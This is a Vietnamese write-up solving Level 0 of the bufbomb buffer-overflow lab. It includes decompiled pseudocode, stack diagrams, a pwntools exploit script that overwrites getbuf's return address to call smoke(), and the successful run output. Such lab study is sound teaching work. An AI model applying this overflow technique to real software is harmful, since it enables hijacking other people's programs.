# Level 0
## Task
```
└─$ ./bufbomb -u 09821978
Userid: 09821978
Cookie: 0x31f21393
Type string:abcdefgh
```
```
└─$ ./bufbomb -u 09821978
Userid: 09821978
Cookie: 0x31f21393
Type string:abcdefgh
Dud: getbuf returned 0x1
Better luck next time
```
> Yêu cầu: Buffer overflow để thực thi hàm `smoke()` từ hàm `test()`.

## Solution
Mở IDA Pro 32bit và xem pseudocode của hàm `test()`.  

```c
int test()
{
  int v1; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  v1 = uniqueval();
  v2 = getbuf();

  if ( uniqueval() != v1 )
    return puts("Sabotaged!: the stack has been corrupted");
  if ( v2 != cookie )
    return printf("Dud: getbuf returned 0x%x\n", v2);
  printf("Boom!: getbuf returned 0x%x\n", v2);
  return validate(3);
}
```  

Có thể thấy, ở trong hàm `test()` có hàm `getbuf()` được dùng để đọc chuỗi vào buffer. Vậy chúng ta tiến hành xem pseudocode của hàm `getbuf()`.  
```c
int getbuf()
{
  char v1[40]; // [esp+0h] [ebp-28h] BYREF

  Gets(v1);
  return 1;
}
```  

Từ đoạn pseudocode trên thì ta có thể thấy, `buffer` sẽ có độ dài là 40 (`0x28`) bytes và `buffer` này sẽ được truyền vào hàm `Gets()` để thực hiện việc đọc chuỗi từ console.  

Trước khi hàm `Gets()` được thực thi, stack của chúng ta sẽ như sau:  
```
+---------------------------------+
|     return address (getbuf)     |---> return address của hàm getbuf()
+---------------------------------+
|           ebp (getbuf)          |---> ebp của hàm getbuf()
+---------------------------------+
               .
               . => 0x24 bytes 
               .
+---------------------------------+
|              v1                 |---> top của stack
+---------------------------------+

```  

Vậy để thực thi được hàm `smoke()`, chúng ta sẽ tìm cách ghi đè địa chỉ của hàm `smoke()` vào ô nhớ stack chứa địa chỉ trả về của hàm `getbuf()` (như hình ảnh minh họa ở trên). Do đó, payload của chúng ta phải có độ dài `0x28 + 0x4 + 0x4` (với `0x28` bytes để fill hết toàn bộ buffer được cấp, `0x4` tiếp theo để ghi đè `ebp` của hàm `getbuf()` và `0x4` cuối cùng chính là địa chỉ của hàm `smoke()`.  

Ở hàm `smoke()`, nếu chúng ta gọi hàm thành công thì chuỗi `Smoke!: You called smoke()` sẽ được in ra console.  
```c
void __noreturn smoke()
{
  puts("Smoke!: You called smoke()");
  validate(0);
  exit(0);
}
```

### Script
Để hiện thực hóa ý tưởng trên thì chúng ta sẽ dùng module `pwn` của Python.  

```python
#! /bin/python3

from pwn import *

context.binary = './bufbomb'

# tạo 1 tiến trình tới chương trình bufbomb
io = process(['./bufbomb', '-u', '09821978'])

e = ELF('./bufbomb')

# tạo payload với (0x28 + 0x4) ký tự 'A'
exploit_payload = b'A'*(0x28 + 4)

# lấy địa chỉ của hàm smoke() và thêm vào payload
exploit_payload += p32(e.symbols['smoke'])

print(exploit_payload)

# nhập payload vào tiến trình bufbomb
io.sendline(exploit_payload)

# hiển thị kết quả
io.interactive()
```  

Stack khi bị buffer overflow:  
```
+---------------------------------+
|     địa chỉ của hàm smoke()     |---> return address của hàm getbuf()
+---------------------------------+
|             'AAAA'              |---> ebp của hàm getbuf()
+---------------------------------+
               .
               . => 0x1C bytes 
               .

+---------------------------------+
|             'AAAA'              |
+---------------------------------+
|             'AAAA'              |
+---------------------------------+
|             'AAAA'              |---> top của stack
+---------------------------------+

```

Chạy script:  

```
└─$ ./level0.py
[*] '/mnt/f/src-team-1/bufbomb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './bufbomb': pid 52
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xeb\x9a\x13\x80'
[*] Switching to interactive mode
[*] Process './bufbomb' stopped with exit code 0 (pid 52)
Userid: 09821978
Cookie: 0x31f21393
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
[*] Got EOF while reading in interactive
$
```  
> Thành công!
